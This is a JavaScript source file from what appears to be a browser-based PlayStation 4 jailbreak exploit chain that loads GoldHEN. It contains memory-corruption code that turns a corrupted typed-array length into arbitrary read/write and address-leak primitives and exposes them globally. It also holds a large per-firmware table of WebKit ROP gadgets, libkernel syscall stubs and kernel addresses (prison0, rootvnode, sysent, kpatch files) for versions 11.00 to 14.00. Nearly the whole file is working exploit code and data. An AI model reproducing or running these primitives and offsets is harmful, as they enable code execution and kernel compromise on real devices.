                && (workerHeader[7] === 0 || workerHeader[7] === 1)
                && pairStatus.workerWindow === WORKER_BUFFER_SIZE

                && workerHeader[MODE_OFF] === mainRecord[MODE_OFF]
                && workerHeader[MODE_OFF + 1] === 0
                && workerHeader[MODE_OFF + 2] === 0
                && workerHeader[MODE_OFF + 3] === 0

                && canonical48(workerHeader, BUTTERFLY_OFF)
                && workerButterfly > 0x100000000 && workerButterfly % 8 === 0

                && canonical48(workerHeader, VECTOR_OFF)
                && fake.validate(workerVector) && workerVector % 8 === 0
                && workerVector !== mainHomeVector;
            if (!gate)
                throw new Error("mem.promote: header gate failed"
                    + ` worker-len=${pairStatus.workerWindow}`
                    + ` worker-mode=${workerHeader[MODE_OFF]}`
                    + ` main-mode=${mainRecord[MODE_OFF]}`
                    + ` worker-sid=${u32At(workerHeader, 0)}`
                    + ` main-sid=${pairStatus.structureID}`
                    + ` worker-vector=0x${pairStatus.workerVector.toString()}`
                    + ` worker-butterfly=0x${pairStatus.workerButterfly.toString()}`
                    + ` main-home=0x${pairStatus.mainVector.toString()}`);

            proveMagic(note, "worker", "workerIdentity",
                workerVector + PAIR_IDENT_OFFSET, workerMagic,
                `vector=0x${pairStatus.workerVector.toString()}`
                + `-cell=0x${pairStatus.workerAddress.toString()}`
                + `-offset=+0x${PAIR_IDENT_OFFSET.toString(16)}`);
            note("PAIR-IDENTITY", "main-cell=proved-main-buffer=proved-worker=proved");

            for (let i = 0; i < 8; ++i)
                workerOriginalVector[i] = workerHeader[VECTOR_OFF + i];
            for (let i = 0; i < 4; ++i)
                workerOriginalLength[i] = workerHeader[LENGTH_OFF + i];

            note("PAIR-COMMIT", `main=0x${pairStatus.mainAddress.toString()}`
                + `-worker=0x${pairStatus.workerAddress.toString()}`
                + "-next=aim-without-restore");
            aimFor(workerAddr, PAIR_HEADER_BYTES);
            committed = true;
            pairStatus.committed = true;

            for (let i = 0; i < 4; ++i)
                mainView[LENGTH_OFF + i] = 0xff;
            pairStatus.workerLength = workerView.length;

            if (pairStatus.workerLength !== WORKER_LENGTH_MAX)
                throw new Error("mem.promote: the m_length write did not land -- "
                    + `worker.length reads ${pairStatus.workerLength}`);
            if (workerMirror.length !== WORKER_BUFFER_SIZE)
                throw new Error("mem.promote: the mirror was widened too -- the write "
                    + "went somewhere structural, not to worker's m_length");
            if (workerView[0] !== HOME_BYTE)
                throw new Error("mem.promote: worker no longer sees its own buffer");

            if (mainView[MODE_OFF] !== workerHeader[MODE_OFF]
                || mainView[MODE_OFF + 1] !== 0 || mainView[MODE_OFF + 2] !== 0
                || mainView[MODE_OFF + 3] !== 0)
                throw new Error("mem.promote: m_mode was disturbed by the widening");

            for (let i = 0; i < 8; ++i) {
                if (mainView[VECTOR_OFF + i] !== workerOriginalVector[i])
                    throw new Error("mem.promote: worker's m_vector moved during the widening");
            }
            note("PAIR-WIDENED", `length=0x${WORKER_LENGTH_MAX.toString(16)}`
                + `-mode=0x${pairStatus.mode.toString(16)}`);

            pairVectorOffset = VECTOR_OFF;
            carrier = buildPairCarrier(fake);
            rebound = true;

            readInto(identityBytes, workerVector + PAIR_IDENT_OFFSET, 8);
            if (!sameBytes$1(identityBytes, workerMagic, 8))
                throw new Error("mem.promote: read through the pair returned "
                    + `${hexOf(identityBytes, 8)}, expected ${hexOf(workerMagic, 8)}`);
            write8(workerVector + PAIR_IDENT_OFFSET,
                new int64(0x0d0c0b0a, 0x04030201));
            const back = [0x0a, 0x0b, 0x0c, 0x0d, 0x01, 0x02, 0x03, 0x04];
            for (let i = 0; i < 8; ++i) {
                if (workerMirror[PAIR_IDENT_OFFSET + i] !== back[i])
                    throw new Error(`mem.promote: write through the pair failed at byte ${i}`);
            }
            for (let i = 0; i < 8; ++i)
                workerMirror[PAIR_IDENT_OFFSET + i] = workerMagic[i];

            const workerAgain = addrNumber(leakval(workerView));
            pairStatus.leakvalAgrees = workerAgain === workerAddr;
            if (!pairStatus.leakvalAgrees)
                throw new Error("mem.promote: leakval through the pair disagrees "
                    + `(0x${toI64(workerAgain).toString()} vs `
                    + `0x${pairStatus.workerAddress.toString()})`);

            const mv = read8(mainAddr + VECTOR_OFF);
            if (mv.low !== pairStatus.workerAddress.low
                || mv.hi !== pairStatus.workerAddress.hi)
                throw new Error(`mem.promote: main.m_vector reads 0x${mv.toString()},`
                    + ` expected worker's cell 0x${pairStatus.workerAddress.toString()}`);
            if (read4(mainAddr + LENGTH_OFF) !== fake.windowBytes)
                throw new Error("mem.promote: main's own m_length was disturbed");
            note("PAIR-REPROVED", `main-m_vector=0x${mv.toString()}`
                + `-leakval=0x${toI64(workerAgain).toString()}`);

            note("PAIR-RELEASE", "next=release-fake-cell-and-debris");
            const rel = releaseFakeCell();
            pairStatus.released = rel.released;
            pairStatus.historyCleared = !!rel.historyCleared;
            if (!fakeCellReleased())
                throw new Error("mem.promote: core.js did not release the fake cell");
            if (fake.assertHome() !== false)
                throw new Error("mem.promote: core.js's carrier still reports itself live");

            pairStatus.promoted = true;
            pairStatus.state = "pair";
            pairStatus.error = null;
            note("PAIR-UP", `main=0x${pairStatus.mainAddress.toString()}`
                + `-worker=0x${pairStatus.workerAddress.toString()}`
                + `-home=0x${pairStatus.mainVector.toString()}`
                + `-mode=0x${pairStatus.mode.toString(16)}`
                + `-sid=0x${pairStatus.structureID.toString(16)}`
                + `-released=${pairStatus.released.length}`
                + `-history-cleared=${pairStatus.historyCleared}`);
            return pairStatus;

        } catch (error) {

            pairStatus.failedAt = pairStatus.stage;
            pairStatus.error = `${error && error.name}: ${String(error && error.message)}`;

            let clean = true;
            if (committed) {
                pairStatus.rolledBack = true;
                try {
                    for (let i = 0; i < 8; ++i)
                        mainView[VECTOR_OFF + i] = workerOriginalVector[i];
                    for (let i = 0; i < 4; ++i)
                        mainView[LENGTH_OFF + i] = workerOriginalLength[i];
                } catch { clean = false; }
                try { fake.restore(); } catch { clean = false; }

                try {
                    if (!(workerView.length === WORKER_BUFFER_SIZE
                        && workerMirror.length === WORKER_BUFFER_SIZE
                        && workerView[0] === HOME_BYTE
                        && fake.assertHome() === true))
                        clean = false;
                } catch { clean = false; }
                pairStatus.rollbackClean = clean;
            }

            try { pairStatus.mainAtHome = fake.assertHome(); }
            catch { pairStatus.mainAtHome = null; }

            pairStatus.promoted = false;
            pairStatus.fallback = true;
            pairStatus.state = (committed && !clean) ? "broken" : "fake";
            if (pairStatus.state === "broken")
                carrier = brokenCarrier(pairStatus.error);
            else if (rebound)
                carrier = fake;

            pairVectorOffset = -1;

            workerView = null;
            workerMirror = null;
            workerBuffer = null;
            mainView = null;
            note("PAIR-FALLBACK", `state=${pairStatus.state}`
                + `-committed=${committed}-rollback-clean=${pairStatus.rollbackClean}`
                + `-main-at-home=${pairStatus.mainAtHome}`
                + `-at=${pairStatus.failedAt}-${pairStatus.error}`);
            throw error;
        }
    }

    function installWindowP(c, options) {
        if (!c || typeof c.aim !== "function")
            throw new TypeError("mem: not a carrier");
        carrier = c;

        const prim = {
            read1, read2, read4, read8,
            write1, write2, write4, write8,
            leakval
        };
        globalThis.p = prim;

        const opts = options || {};
        if (opts.promote === false) {
            pairStatus.state = "disabled";
            pairStatus.stage = "disabled";
            pairStatus.error = "promotion disabled by the caller (negative control)";
            return prim;
        }

        try {
            promoteToRealPair(opts.onEvent);
        } catch {

            if (pairStatus.state === "broken") {
                globalThis.p = undefined;
                throw new Error("mem: the promotion failed AND its rollback did not "
                    + "verify -- window.p has been WITHDRAWN rather than published "
                    + `mis-aimed. failedAt=${pairStatus.failedAt} ${pairStatus.error}`);
            }
        }
        return prim;
    }

    const PS4 = {
      "11.00": {
        fw_status: "state=proven step4q=90/0 reboot=0 kernel_rvas=5/5-vs-dump",

        k_idt_rsvd: 0x2d2430,

        wk_expm1_builtin: 0x2193f30,

        wk_JSFunction_m_function: 0x28,

        wk_CSSFontFace_vtable: 0x3627aa8,

        wk___imp___error: 0x36e1c68,
        k__error: 0x3370,
        wk___imp_strerror: 0x36e1c98,
        c_strerror: 0x10d00,

        wk_POP_RDI_RET: 0x357a0,
        wk_POP_RAX_RET: 0x4e6a9,

        wk_MOV_RDI_RSI_30_CALL: 0x24dae58,

        wk_POP_RAX_MOV_RAX_JMP_18: 0x11d5d53,

        wk_PUSH_RBP_MOV_RBP_RSP_10: 0x2f1890,

        wk_MOV_RDI_RAX_8_CALL_20: 0x41a81,

        wk_MOV_RDX_RAX_18_CALL_10: 0x90ffe6,

        wk_PUSH_RDX_POP_RSP_RET: 0x1cc607a,

        wk_MOV_QWORD_PTR_RDI_RAX_RET: 0x97db,
        wk_LEAVE_RET: 0x31f9d,

        wk_POP_RSI_RET: 0x249e2,
        wk_POP_RDX_RET: 0x10d11,
        wk_POP_RCX_RET: 0x71617,

        wk_POP_R8_RET: 0xe53a2,
        wk_POP_R9_RET: 0x6403a1,

        pivot_view_sp: 0x18,

        wk_ArrayBuffer_m_impl: 0x10,

        wk_ArrayBuffer_m_contents_m_data: 0x10,

        k_getpid: 0x1b280,

        k_scan_stage1: 0x40000,
        k_scan_stage2: 0x60000,

        k_evf_cv: 0x7fc26f,
        k_sysent_661: 0x1109350,
        k_jmp_rsi: 0x71a21,
      },

      "11.50": {
        fw_status:
          "state=proven step4q=90/0 reboot=0 webkit=step7-20/20-x2 " +
          "kernel_rvas=untested-vs-dump kstr_residue=0x318",

        wk_expm1_builtin: 0x2587bd0,
        wk_JSFunction_m_function: 0x28,

        wk_POP_RDI_RET: 0x2445241,
        wk_POP_RSI_RET: 0x2503c9e,
        wk_POP_RDX_RET: 0x24cfa22,
        wk_POP_RCX_RET: 0x24c7ebf,
        wk_POP_RAX_RET: 0x2554e3f,
        wk_POP_R8_RET: 0x23bb4bd,
        wk_POP_R9_RET: 0x1c2cda1,
        wk_LEAVE_RET: 0x23c3790,
        wk_MOV_QWORD_PTR_RDI_RAX_RET: 0x2445d1a,

        wk_MOV_RDI_RSI_30_CALL: 0x29609f8,
        wk_POP_RAX_MOV_RAX_JMP_18: 0x1c8bbc3,
        wk_PUSH_RBP_MOV_RBP_RSP_10: 0x1645270,
        wk_MOV_RDI_RAX_8_CALL_20: 0x1e3f795,
        wk_MOV_RDX_RAX_18_CALL_10: 0x1dea16a,
        wk_PUSH_RDX_POP_RSP_RET: 0x2abe00a,

        pivot_view_sp: 0x38,
        wk_ArrayBuffer_m_impl: 0x10,
        wk_ArrayBuffer_m_contents_m_data: 0x10,

        wk___imp___error: 0x3cbcc98,
        k__error: 0x183c0,

        wk___imp_pthread_create: 0x3cbdbb8,
        k_pthread_create: 0xa1d0,

        k_stubs: {
          3: 0x2c170,
          4: 0x2b8d0,
          5: 0x2b970,
          6: 0x2d620,
          20: 0x2cb70,
          23: 0x2b6f0,
          24: 0x2d5e0,
          25: 0x2b4d0,
          30: 0x2c9d0,
          54: 0x2cff0,
          92: 0x2b650,
          97: 0x2d050,
          98: 0x2b5f0,
          104: 0x2d380,
          105: 0x2b490,
          106: 0x2d480,
          118: 0x2b2f0,
          135: 0x2c280,
          240: 0x2d4c0,
          331: 0x2c6b0,
          432: 0x2b510,
          466: 0x2cc70,
          487: 0x2ba80,
          488: 0x2bd10,
          538: 0x2b430,
          539: 0x2b4f0,
          544: 0x2beb0,
          545: 0x2ca30,
          632: 0x2d090,
          633: 0x2d840,
          662: 0x2ccb0,
          663: 0x2c3e0,
          664: 0x2d740,
          666: 0x2d540,
          669: 0x2bdf0,
        },
        k_scan_stage1: 0x40000,
        k_scan_stage2: 0x60000,

        k_evf_cv: 0x784318,
        k_sysent_661: 0x110a760,
        k_jmp_rsi: 0x704d5,
      },
      "12.00": {
        fw_status:
          "state=UNTESTED-on-hardware webkit=offline-from-sprx " +
          "anchor=findcaller-validated-on-11.50 " +
          "kernel_rvas=verified-vs-kernel_1202.elf kpatch=10/10-sites-verified",

        k_idt_rsvd: 0x1c1d00,

        wk_expm1_builtin: 0x2585090,
        wk_JSFunction_m_function: 0x28,

        wk_POP_RDI_RET: 0x4902f,
        wk_POP_RSI_RET: 0x10e37,
        wk_POP_RDX_RET: 0xf7a,
        wk_POP_RCX_RET: 0x53c0b,
        wk_POP_RAX_RET: 0x22f53,
        wk_POP_R8_RET: 0x22f52,
        wk_POP_R9_RET: 0x60b6c1,
        wk_LEAVE_RET: 0x11823,
        wk_MOV_QWORD_PTR_RDI_RAX_RET: 0x2b5cb,
        wk_PUSH_RDX_POP_RSP_RET: 0x2abb03a,
        wk_MOV_RDI_RSI_30_CALL: 0x295dcd8,
        wk_POP_RAX_MOV_RAX_JMP_18: 0x8e4873,
        wk_PUSH_RBP_MOV_RBP_RSP_10: 0x285e10,
        wk_MOV_RDI_RAX_8_CALL_20: 0x6c7b0d,
        wk_MOV_RDX_RAX_18_CALL_10: 0xd37cca,

        pivot_view_sp: 0x38,
        wk_ArrayBuffer_m_impl: 0x10,
        wk_ArrayBuffer_m_contents_m_data: 0x10,

        wk___imp___error: 0x3cbcc48,
        k__error: 0x299c0,
        wk___imp_pthread_create: 0x3cbdb80,
        k_pthread_create: 0x24e00,

        k_stubs: {
          3: 0x2c160,
          4: 0x2b8c0,
          5: 0x2b960,
          6: 0x2d610,
          20: 0x2cb60,
          23: 0x2b6e0,
          24: 0x2d5d0,
          25: 0x2b4c0,
          30: 0x2c9c0,
          54: 0x2cfe0,
          92: 0x2b640,
          97: 0x2d040,
          98: 0x2b5e0,
          104: 0x2d370,
          105: 0x2b480,
          106: 0x2d470,
          118: 0x2b2e0,
          135: 0x2c270,
          240: 0x2d4b0,
          331: 0x2c6a0,
          432: 0x2b500,
          466: 0x2cc60,
          487: 0x2ba70,
          488: 0x2bd00,
          538: 0x2b420,
          539: 0x2b4e0,
          544: 0x2bea0,
          545: 0x2ca20,
          632: 0x2d080,
          633: 0x2d830,
          662: 0x2cca0,
          663: 0x2c3d0,
          664: 0x2d730,
          666: 0x2d530,
          669: 0x2bde0,
        },
        k_scan_stage1: 0x40000,
        k_scan_stage2: 0x60000,

        k_evf_cv: 0x784798,
        k_sysent_661: 0x110a760,
        k_jmp_rsi: 0x47b31,
      },
      "13.00": {
        fw_status:
          "state=proven step10=32/0-x3 reboot=0 webkit=step7-20/20 anchor=findcaller kernel_rvas=verified-on-hardware kpatch=1300.bin-10-sites-verified bug=poops",

        k_idt_rsvd: 0x1c1d40,

        wk_expm1_builtin: 0x2586880,
        wk_JSFunction_m_function: 0x28,

        wk_POP_RDI_RET: 0x5c480,
        wk_POP_RSI_RET: 0x6e45e,
        wk_POP_RDX_RET: 0x12c5ba,
        wk_POP_RCX_RET: 0x1bade,
        wk_POP_RAX_RET: 0x10504,
        wk_POP_R8_RET: 0x9b311,
        wk_POP_R9_RET: 0x1dcfb1,
        wk_LEAVE_RET: 0x182f7,
        wk_MOV_QWORD_PTR_RDI_RAX_RET: 0x548b,
        wk_PUSH_RDX_POP_RSP_RET: 0x2abccaa,
        wk_MOV_RDI_RSI_30_CALL: 0x295f948,
        wk_POP_RAX_MOV_RAX_JMP_18: 0x1d989e3,
        wk_PUSH_RBP_MOV_RBP_RSP_10: 0x25bae0,
        wk_MOV_RDI_RAX_8_CALL_20: 0x4a0406,
        wk_MOV_RDX_RAX_18_CALL_10: 0x1ec3ada,

        pivot_view_sp: 0x38,
        wk_ArrayBuffer_m_impl: 0x10,
        wk_ArrayBuffer_m_contents_m_data: 0x10,

        wk___imp___error: 0x3cb8cc8,
        k__error: 0x26420,
        wk___imp_pthread_create: 0x3cb9c00,
        k_pthread_create: 0x10110,

        k_stubs: {
          3: 0x2c170,
          4: 0x2b8d0,
          5: 0x2b970,
          6: 0x2d620,
          20: 0x2cb70,
          23: 0x2b6f0,
          24: 0x2d5e0,
          25: 0x2b4d0,
          30: 0x2c9d0,
          54: 0x2cff0,
          92: 0x2b650,
          97: 0x2d050,
          98: 0x2b5f0,
          104: 0x2d380,
          105: 0x2b490,
          106: 0x2d480,
          118: 0x2b2f0,
          135: 0x2c280,
          240: 0x2d4c0,
          331: 0x2c6b0,
          432: 0x2b510,
          466: 0x2cc70,
          487: 0x2ba80,
          488: 0x2bd10,
          538: 0x2b430,
          539: 0x2b4f0,
          544: 0x2beb0,
          545: 0x2ca30,
          632: 0x2d090,
          633: 0x2d840,
          662: 0x2ccb0,
          663: 0x2c3e0,
          664: 0x2d740,
          666: 0x2d540,
          669: 0x2bdf0,
        },
        k_scan_stage1: 0x40000,
        k_scan_stage2: 0x60000,

        k_kl_lock: 0xe6c20,

        k_evf_cv: 0x0,
        k_sysent_661: 0x110a760,
        k_jmp_rsi: 0x47b31,

        k_oid_kern_file: 0x1a2f8a0,
        k_oid_maxfilesperproc: 0x1a2f950,
        k_oid_maxprocperuid: 0x1a3ba88,
        k_oid_maxfiles: 0x1a2f9a8,
        k_arg1_maxfilesperproc: 0x22cc47c,
        k_arg1_maxprocperuid: 0x22cc478,
        k_arg1_maxfiles: 0x22cc474,
        k_sysctl_handle_int: 0x3fa090,
        k_prison0: 0x1a5c0c0,
        k_rootvnode: 0x2136e90,
        k_sysent: 0x1102b70,
      },
      "12.50": {
        fw_status:
          "state=UNTESTED-on-hardware " +
          "webkit=addfw-from-decrypted-12.50-modules (15/15 gadgets, 35/35 stubs) " +
          "anchor=findcaller-offline (self-check reproduces the known 11.50 and " +
          "12.00 anchors) " +
          "kernel_rvas=asserted-by-supplied-table STILL-UNVERIFIED (no 12.50 kernel " +
          "dump) but CORROBORATED: all three byte-verified in the 13.00 hardware dump " +
          "AND in kernel_1202.elf at the identical RVAs, and 12.02<->13.00 share their " +
          "first megabyte 96.7% at ZERO shift (11.00<->12.02 is 3.7%), so 12.50/12.52 " +
          "sit between two builds whose low text does not move " +
          "kpatch=1250.bin bug=poops",

        wk_expm1_builtin: 0x2585110,
        wk_JSFunction_m_function: 0x28,

        wk_POP_RDI_RET: 0x4902f,
        wk_POP_RSI_RET: 0x10e37,
        wk_POP_RDX_RET: 0x771ea,
        wk_POP_RCX_RET: 0x5def9,
        wk_POP_RAX_RET: 0x22f53,
        wk_POP_R8_RET: 0x22f52,
        wk_POP_R9_RET: 0x60b6c1,
        wk_LEAVE_RET: 0x77caa,
        wk_MOV_QWORD_PTR_RDI_RAX_RET: 0x2b5cb,
        wk_PUSH_RDX_POP_RSP_RET: 0x2abb0ba,
        wk_MOV_RDI_RSI_30_CALL: 0x295dd58,
        wk_POP_RAX_MOV_RAX_JMP_18: 0x8e4873,
        wk_PUSH_RBP_MOV_RBP_RSP_10: 0x285e10,
        wk_MOV_RDI_RAX_8_CALL_20: 0x6c7b0d,
        wk_MOV_RDX_RAX_18_CALL_10: 0xd37cca,

        pivot_view_sp: 0x38,
        wk_ArrayBuffer_m_impl: 0x10,
        wk_ArrayBuffer_m_contents_m_data: 0x10,

        wk___imp___error: 0x3cb4c48,
        k__error: 0xd9d0,
        wk___imp_pthread_create: 0x3cb5b80,
        k_pthread_create: 0x23d20,

        k_stubs: {
          3: 0x2c160,
          4: 0x2b8c0,
          5: 0x2b960,
          6: 0x2d610,
          20: 0x2cb60,
          23: 0x2b6e0,
          24: 0x2d5d0,
          25: 0x2b4c0,
          30: 0x2c9c0,
          54: 0x2cfe0,
          92: 0x2b640,
          97: 0x2d040,
          98: 0x2b5e0,
          104: 0x2d370,
          105: 0x2b480,
          106: 0x2d470,
          118: 0x2b2e0,
          135: 0x2c270,
          240: 0x2d4b0,
          331: 0x2c6a0,
          432: 0x2b500,
          466: 0x2cc60,
          487: 0x2ba70,
          488: 0x2bd00,
          538: 0x2b420,
          539: 0x2b4e0,
          544: 0x2bea0,
          545: 0x2ca20,
          632: 0x2d080,
          633: 0x2d830,
          662: 0x2cca0,
          663: 0x2c3d0,
          664: 0x2d730,
          666: 0x2d530,
          669: 0x2bde0,
        },
        k_scan_stage1: 0x40000,
        k_scan_stage2: 0x60000,

        k_evf_cv: 0x0,
        k_sysent_661: 0x110a760,
        k_jmp_rsi: 0x47b31,
        k_kl_lock: 0xe6c20,
      },
    };

    PS4["13.50"] = {
      fw_status:
        "state=663-JB-PROVEN-on-hw webkit=13.00-module libkernel=13.50-stubs " +
        "kernel_rvas=MEASURED-from-kernel_1350.elf (kderive 16/16, adversarial 16/16 GO) " +
        "kpatch=1350.bin-BUILT-10/10-neg-controls-pass-UNTESTED-on-hw bug=663",

      wk_expm1_builtin: 0x2586880,
      wk_JSFunction_m_function: 0x28,

      wk_POP_RDI_RET: 0x5c480,
      wk_POP_RSI_RET: 0x6e45e,
      wk_POP_RDX_RET: 0x12c5ba,
      wk_POP_RCX_RET: 0x1bade,
      wk_POP_RAX_RET: 0x10504,
      wk_POP_R8_RET: 0x9b311,
      wk_POP_R9_RET: 0x1dcfb1,
      wk_LEAVE_RET: 0x182f7,
      wk_MOV_QWORD_PTR_RDI_RAX_RET: 0x548b,
      wk_PUSH_RDX_POP_RSP_RET: 0x2abccaa,
      wk_MOV_RDI_RSI_30_CALL: 0x295f948,
      wk_POP_RAX_MOV_RAX_JMP_18: 0x1d989e3,
      wk_PUSH_RBP_MOV_RBP_RSP_10: 0x25bae0,
      wk_MOV_RDI_RAX_8_CALL_20: 0x4a0406,
      wk_MOV_RDX_RAX_18_CALL_10: 0x1ec3ada,

      pivot_view_sp: 0x38,
      wk_ArrayBuffer_m_impl: 0x10,
      wk_ArrayBuffer_m_contents_m_data: 0x10,

      wk___imp___error: 0x3cb8cc8,
      k__error: 0x1a0f0,
      wk___imp_pthread_create: 0x3cb9c00,
      k_pthread_create: 0x21790,

      k_stubs: {
        3: 0x2c170,
        4: 0x2b8d0,
        5: 0x2b970,
        6: 0x2d620,
        20: 0x2cb70,
        23: 0x2b6f0,
        24: 0x2d5e0,
        25: 0x2b4d0,
        30: 0x2c9d0,
        54: 0x2cff0,
        92: 0x2b650,
        97: 0x2d050,
        98: 0x2b5f0,
        104: 0x2d380,
        105: 0x2b490,
        106: 0x2d480,
        118: 0x2b2f0,
        135: 0x2c280,
        240: 0x2d4c0,
        331: 0x2c6b0,
        432: 0x2b510,
        466: 0x2cc70,
        487: 0x2ba80,
        488: 0x2bd10,
        538: 0x2b430,
        539: 0x2b4f0,
        544: 0x2beb0,
        545: 0x2ca30,
        632: 0x2d090,
        633: 0x2d840,
        662: 0x2ccb0,
        663: 0x2c3e0,
        664: 0x2d740,
        666: 0x2d540,
        669: 0x2bdf0,
      },
      k_scan_stage1: 0x40000,
      k_scan_stage2: 0x60000,

      k_idt_rsvd: 0x1c1d60,
      k_sysctl_handle_int: 0x3fa4e0,
      k_jmp_rsi: 0x47b31,
      k_kl_lock: 0xe6c20,
      k_evf_cv: 0x784e18,
      k_sysent: 0x1102b70,
      k_sysent_661: 0x110a760,
      k_oid_kern_file: 0x1a2f8a0,
      k_oid_maxfilesperproc: 0x1a2f950,
      k_oid_maxprocperuid: 0x1a3ba88,
      k_oid_maxfiles: 0x1a2f9a8,
      k_arg1_maxfilesperproc: 0x22cc47c,
      k_arg1_maxprocperuid: 0x22cc478,
      k_arg1_maxfiles: 0x22cc474,
      k_prison0: 0x1a5c0c0,
      k_rootvnode: 0x2136e90,
      kpatch: "1350.bin",
    };

    PS4["13.52"] = Object.assign({}, PS4["13.50"], {
      alias_of: "13.50",

      k_idt_rsvd: 0x1c1e00,

      k_oid_kern_file: 0x1a2f8a0,
      k_oid_maxfilesperproc: 0x1a2f950,
      k_oid_maxprocperuid: 0x1a3ba88,
      k_oid_maxfiles: 0x1a2f9a8,
      k_arg1_maxfilesperproc: 0x22cc47c,
      k_arg1_maxprocperuid: 0x22cc478,
      k_arg1_maxfiles: 0x22cc474,
      k_sysctl_handle_int: 0x3fa8e0,
      k_prison0: 0x1a5c0c0,
      k_rootvnode: 0x2136e90,
      k_sysent: 0x1102b70,
      k_sysent_661: 0x110a760,
      k_jmp_rsi: 0x4d6d0,

      k_kl_lock: 0xe6c60,
      k_evf_cv: 0x785228,

      kpatch: "1352.bin",

      fw_status:
        "state=663-LIVE-on-hardware shares=13.50 (webkit+libkernel) " +
        "kernel_rvas=MEASURED-from-kernel_1352.elf (kdump5 tier1 36MB pass=39/0, " +
        "kderive 16/16 recipes) kpatch=1352.bin-24-sites-verified-OFFLINE-ONLY " +
        "bug=663",
    });

    PS4["13.02"] = Object.assign({}, PS4["13.00"], {
      alias_of: "13.00",

      k_idt_rsvd: 0x1c1d50,
      k_sysctl_handle_int: 0x3fa0a0,
      k_jmp_rsi: 0x47b31,
      k_kl_lock: 0xe6c20,
      k_evf_cv: 0x7849d8,
      k_sysent: 0x1102b70,
      k_sysent_661: 0x110a760,
      k_oid_kern_file: 0x1a2f8a0,
      k_oid_maxfilesperproc: 0x1a2f950,
      k_oid_maxprocperuid: 0x1a3ba88,
      k_oid_maxfiles: 0x1a2f9a8,
      k_arg1_maxfilesperproc: 0x22cc47c,
      k_arg1_maxprocperuid: 0x22cc478,
      k_arg1_maxfiles: 0x22cc474,
      k_prison0: 0x1a5c0c0,
      k_rootvnode: 0x2136e90,
      kpatch: "1302.bin",
      fw_status:
        "state=663-JB+KPATCH-PROVEN-on-hw-pass=51 shares=13.00 (webkit+libkernel, PRIMITIVE-OK) " +
        "kernel_rvas=MEASURED-from-kernel_1302.elf (16/16 GO) same-kernel-as=13.04 " +
        "kpatch=1302.bin-HW-PROVEN-KEXEC-rc0 bug=663",
    });

    PS4["13.04"] = Object.assign({}, PS4["13.00"], {
      alias_of: "13.00",

      k_idt_rsvd: 0x1c1d50,
      k_sysctl_handle_int: 0x3fa0a0,
      k_jmp_rsi: 0x47b31,
      k_kl_lock: 0xe6c20,
      k_evf_cv: 0x7849d8,
      k_sysent: 0x1102b70,
      k_sysent_661: 0x110a760,
      k_oid_kern_file: 0x1a2f8a0,
      k_oid_maxfilesperproc: 0x1a2f950,
      k_oid_maxprocperuid: 0x1a3ba88,
      k_oid_maxfiles: 0x1a2f9a8,
      k_arg1_maxfilesperproc: 0x22cc47c,
      k_arg1_maxprocperuid: 0x22cc478,
      k_arg1_maxfiles: 0x22cc474,
      k_prison0: 0x1a5c0c0,
      k_rootvnode: 0x2136e90,
      kpatch: "1302.bin",
      fw_status:
        "state=663-JB+KPATCH-via-13.02(pass=51) shares=13.00 (webkit+libkernel, PRIMITIVE-OK) " +
        "kernel_rvas=SAME-KERNEL-AS-13.02 (measured from kernel_1302.elf, 16/16 GO) " +
        "kpatch=1302.bin-shared-HW-PROVEN bug=663",
    });

    PS4["12.02"] = Object.assign({}, PS4["12.00"], {
      alias_of: "12.00",
      fw_status:
        "state=UNTESTED-on-hardware shares=12.00 " +
        "kernel_rvas=verified-vs-kernel_1202.elf (this firmware) " +
        "kpatch=1200.bin-10-sites-verified bug=lapse",
      kpatch: "1200.bin",
    });

    PS4["12.52"] = Object.assign({}, PS4["12.50"], {
      alias_of: "12.50",
      fw_status:
        "state=UNTESTED-on-hardware shares=12.50 " +
        "webkit=assumed-identical-to-12.50 (no 12.52 module dump) " +
        "kernel_rvas=STILL-UNVERIFIED but corroborated via 12.02+13.00 dumps " +
        "kpatch=1250.bin bug=poops",
      kpatch: "1250.bin",
    });

    PS4["11.52"] = Object.assign({}, PS4["11.50"], {
      alias_of: "11.50",
      fw_status:
        "state=UNTESTED-on-hardware shares=11.50 " +
        "webkit=assumed-identical-to-11.50 " +
        "kernel_rvas=untested-vs-dump " +
        "kpatch=1150.bin",
      kpatch: "1150.bin",
    });

    PS4["14.00"] = Object.assign({}, PS4["13.52"], {
      alias_of: "13.52-webkit",

      // Reported on screen on every run, so it names what actually runs: the
      // Karo uses the embedded 14.00 kernel stage and a fixed payload file.
      fw_status:
        "state=14.00 " +
        "webkit=13.52-identical " +
        "kernel=embedded-14.00-stage (apm-UAF) " +
        "payload=payload.bin",

      k_stubs: undefined,
      wk___imp_pthread_create: undefined,
      k_pthread_create: undefined,

      k_idt_rsvd: undefined,
      k_sysctl_handle_int: undefined,
      k_jmp_rsi: undefined,
      k_kl_lock: undefined,
      k_evf_cv: undefined,
      k_sysent: undefined,
      k_sysent_661: undefined,

      k_oid_kern_file: undefined,
      k_oid_maxfilesperproc: undefined,
      k_oid_maxprocperuid: undefined,
      k_oid_maxfiles: undefined,

      k_arg1_maxfilesperproc: undefined,
      k_arg1_maxprocperuid: undefined,
      k_arg1_maxfiles: undefined,

      k_prison0: undefined,
      k_rootvnode: undefined,
    });

    function offsetsFor(uaString) {
      const m = (uaString || "").match(/PlayStation\s+4[\/ ](\d+)\.(\d+)/);
      if (!m) return { key: null, off: null };

      const key = m[1] + "." + parseInt(m[2], 16).toString(16).padStart(2, "0");
      return { key, off: PS4[key] || null };
    }

    const lines = [];
    let alreadyLoaded = false;
    const params = new URLSearchParams(location.search);
    // Karo Host runs the embedded 14.00 kernel stage directly; no URL flag is needed.
    const USE_OWN_KERNEL_STAGE = true;
    const KaroPayloadFile = "payload.bin";

    /* Karo Host UI adapter: send final status messages to its existing log. */
    function karoMessage(message, color) {
      try {
        if (typeof window.log === "function") window.log(message, color);
        else {
          var progress = document.getElementById("progress");
          if (progress) progress.textContent = message;
        }
      } catch (e) {}
    }

    function hostOk() {
      karoMessage("GoldHEN v2.4b18.13 Loaded ...", "#00ff00");
    }

    function hostFail() {
      karoMessage("Failed to Load! Restart Your Console ...", "yellow");
    }

    function hostAlready() {
      karoMessage("GoldHEN is Already Loaded ...", "#00ff00");
    }

    function hostRetry() {
      karoMessage("Failed to Load! Reopen the Browser ...", "red");
    }

    /* The retry notice. Two things lead here: the chain throws, or it stalls
       without a word. The watchdog covers the second case. It cannot fire when
       the whole WebProcess is gone -- then the screen stays as it is -- but in
       the commoner case, a stuck thread on a live page, the Karo status line is updated. */
    let lastMark = Date.now();
    let retryShown = false;

    function showRetry() {
      if (retryShown) return;
      retryShown = true;
      hostRetry();
    }

    const WATCHDOG_MS = 45000;
